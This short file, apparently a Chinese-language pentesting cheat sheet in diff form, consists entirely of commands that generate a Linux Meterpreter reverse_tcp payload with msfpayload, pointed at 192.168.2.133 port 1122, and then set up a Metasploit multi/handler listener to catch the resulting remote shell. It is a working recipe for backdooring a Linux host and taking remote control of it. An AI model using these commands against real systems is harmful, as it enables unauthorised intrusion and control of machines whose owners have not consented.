@@ -1,0 +1,12 @@
+Linux(上下payload一致)
+生成shellcode
+msfpayload    linux/x86/meterpreter/reverse_tcp   LHOST=192.168.2.133 LPORT=1122 X>/root/linux
+
+
+监听shellcode
+msf
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST 192.168.2.133
+set LPORT 1122
+exploit
